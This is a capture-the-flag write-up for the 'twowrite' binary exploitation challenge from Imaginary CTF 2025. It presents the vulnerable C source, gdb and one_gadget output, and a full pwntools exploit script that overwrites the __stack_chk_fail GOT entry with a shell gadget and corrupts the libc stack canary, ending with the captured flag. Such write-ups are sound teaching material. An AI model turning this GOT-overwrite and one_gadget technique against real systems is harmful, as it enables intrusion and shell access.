---
title: twowrite
---
# twowrite

A binary exploitation problem from Imaginary CTF 2025

## Description double the writes from last year

## Provided files:
- `vuln`
- `nsjail.cfg`
- `vuln.c`
- `Makefile`
- `flag.txt` (for testing)
- `Dockerfile`
- `libc.so.6`


## Summary You have two arbitrary writes:
- write a `one_gadget` into `__stack_chk_fail@plt`
- overwrite the stack canary in `libc` via static offset from `system`

## Solve

Running `checksec`:

``` Arch:       amd64-64-little RELRO:      Partial RELRO Stack:      Canary
found NX:         NX enabled PIE:        No PIE (0x400000) SHSTK:      Enabled
IBT:        Enabled Stripped:   No ```

We have partial RELRO and no PIE.

From `vuln.c` and `vuln`, we can see that we can write to two arbitrary writes:

``` #include <stdio.h> #include <stdlib.h> #include <unistd.h>

int main() { setbuf(stdin, NULL); setbuf(stdout, NULL);

    long what1, what2; long *where1, *where2;

    printf("system @ %p\n", &system); printf("what? "); scanf("%ld%*c",
    &what1); printf("what? "); scanf("%ld%*c", &what2); printf("where? ");
    scanf("%p%*c", &where1); printf("where? "); scanf("%p%*c", &where2);

    where1[0] = what1; where1[1] = what2; where2[0] = what1; where2[1] = what2;

    return 0; } ```

We are also given the address of `system`, giving us the base address of
`libc`.

However, we do not know anything about the stack, so we can't write to the
return address and hijack control flow that way.

If the writes weren't at the end, we could have overwritten something in the
global offset table (GOT). Or maybe we still can!

We do have one last PLT/GOT function call: `__stack_chk_fail`:

``` 0x00000000004012e7 <+337>:   mov    eax,0x0 0x00000000004012ec <+342>:
mov    rdx,QWORD PTR [rbp-0x8] 0x00000000004012f0 <+346>:   sub    rdx,QWORD
PTR fs:0x28 0x00000000004012f9 <+355>:   je     0x401300 <main+362>
0x00000000004012fb <+357>:   call   0x401070 <__stack_chk_fail@plt>
0x0000000000401300 <+362>:   leave 0x0000000000401301 <+363>:   ret ```

Of course this only happens when the stack canary is overwritten, but the stack
canary is on the stack. We don't know anything about the stack.

However, we *do* know about `libc`, where the stack canary is generated.

One of my teammates figured out that the stack canary was a static offset away
from `system`. For some reason, on my Ubuntu 24.04.3 VM, this wasn't static. We
both agreed to start doing work within the provided Docker image:

```Dockerfile FROM
ubuntu:25.04@sha256:57665ab8178042ef197191fd77d21d8a2f7f535acd26ff7bd548b1f340f081d7
as chroot

RUN /usr/sbin/useradd --no-create-home -u 1024 user

COPY flag.txt /home/user/flag.txt COPY vuln /home/user/chal RUN chmod 555
/home/user/chal

ENV DEBIAN_FRONTEND noninteractive RUN apt-get update; apt-get -y install socat

FROM
gcr.io/kctf-docker/challenge@sha256:d884e54146b71baf91603d5b73e563eaffc5a42d494b1e32341a5f76363060fb

COPY --from=chroot / /chroot

COPY nsjail.cfg /home/user/

CMD kctf_setup && \ kctf_drop_privs \ socat \ TCP-LISTEN:1337,reuseaddr,fork \
EXEC:"kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/chal" ```

The `kctf-docker` part was annoying, so I deleted it and just worked within the
Ubuntu 25.04 image.

Using `pwntools` and `gdb`, we were able to determine the offset between the
`libc` canary and `system`:

```py #!/usr/bin/env python3 from pwn import *

exe = ELF("./chal") libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe

def conn(): if args.LOCAL: r = process([exe.path]) if args.GDB: gdb.attach(r)
else: r = remote("twowrite.chal.imaginaryctf.org", 1337)

    return r


def main(): r = conn() if args.LOCAL: gdb.attach(r, """ b *main+285 c """)

    r.recvuntil(b"@ ") system = int(r.recvline(), 16) libc.address = system -
    libc.sym['system'] print("system", hex(system)) r.interactive()


if __name__ == "__main__": main()

```

``` gef_  x/gx $rbp-8 0x7fff664a5738: 0xa753c44bfe4b1d00 gef_  search-pattern
0xa753c44bfe4b1d00 [+] Searching '\x00\x1d\x4b\xfe\x4b\xc4\x53\xa7' in memory
[+] In (0x704449d5f000-0x704449d62000), permission=rw- 0x704449d5f768 -
0x704449d5f788  _   "\x00\x1d\x4b\xfe\x4b\xc4\x53\xa7[...]" [+] In
'[stack]'(0x7fff66487000-0x7fff664a8000), permission=rw- 0x7fff664a53b8 -
0x7fff664a53d8  _   "\x00\x1d\x4b\xfe\x4b\xc4\x53\xa7[...]" 0x7fff664a55e8 -
0x7fff664a5608  _   "\x00\x1d\x4b\xfe\x4b\xc4\x53\xa7[...]" 0x7fff664a5648 -
0x7fff664a5668  _   "\x00\x1d\x4b\xfe\x4b\xc4\x53\xa7[...]" 0x7fff664a5738 -
0x7fff664a5758  _   "\x00\x1d\x4b\xfe\x4b\xc4\x53\xa7[...]" 0x7fff664a57d8 -
0x7fff664a57f8  _   "\x00\x1d\x4b\xfe\x4b\xc4\x53\xa7[...]" gef_  p/d
0x704449dbe110 - 0x704449d5f768 $1 = 387496 ```

Now that we knew the offset, we could overwrite the canary, triggering
`__stack_chk_fail`, which we can overwrite with anything.

What should we overwrite it with? It turns out, there's a neat cool called
[`one_gadget`](https://github.com/david942j/one_gadget), which finds single
addresses in `libc` that create shells.

The `one_gadget` output of the Docker's `libc.so.6` was as follows:

``` # one_gadget /lib/x86_64-linux-gnu/libc.so.6 0xf7277 execve("/bin/sh",
rbp-0x50, r13) constraints: address rbp-0x48 is writable r12 == NULL ||
{"/bin/sh", r12, NULL} is a valid argv [r13] == NULL || r13 == NULL || r13 is a
valid envp

0xf72d2 execve("/bin/sh", rbp-0x50, [rbp-0x70]) constraints: address rbp-0x50
is writable rax == NULL || {"/bin/sh", rax, NULL} is a valid argv [[rbp-0x70]]
== NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0x11b91a posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x48], 0, rsp+0x70, [rsp+0xf0])
constraints: [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80],
[rsp+0x88], ...} is a valid argv [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL ||
[rsp+0xf0] is a valid envp [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0

0x11b922 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x48], 0, rsp+0x70, r14)
constraints: [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80],
[rsp+0x88], ...} is a valid argv [r14] == NULL || r14 == NULL || r14 is a valid
envp [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0

0x11b927 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r14) constraints:
[rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is
a valid argv [r14] == NULL || r14 == NULL || r14 is a valid envp rdx == NULL ||
(s32)[rdx+0x4] <= 0 ```

The second address ended up working!

## Final Script

```py #!/usr/bin/env python3 from pwn import *

exe = ELF("./chal") libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe

def conn(): if args.LOCAL: r = process([exe.path]) if args.GDB: gdb.attach(r)
else: r = remote("twowrite.chal.imaginaryctf.org", 1337)

    return r


def main(): r = conn() if args.LOCAL: gdb.attach(r, """ b *main+285 c """)

    r.recvuntil(b"@ ") system = int(r.recvline(), 16) libc.address = system -
    libc.sym['system'] print("system", hex(system))


    one_gadget = 0xf72d2 r.sendlineafter(b'? ', f"{libc.address +
    one_gadget}".encode()) r.sendlineafter(b'? ', f"{0}".encode())
    r.sendlineafter(b'? ', hex(exe.got['__stack_chk_fail']).encode())
    r.sendlineafter(b'? ', hex(system-387496-8).encode()) r.interactive()


if __name__ == "__main__": main() ```

## Flag

```
ictf{d0nt_y0u_l0ve_it_when_the_p0inters_demangle_themselves_77a90021e9a8a690}
```
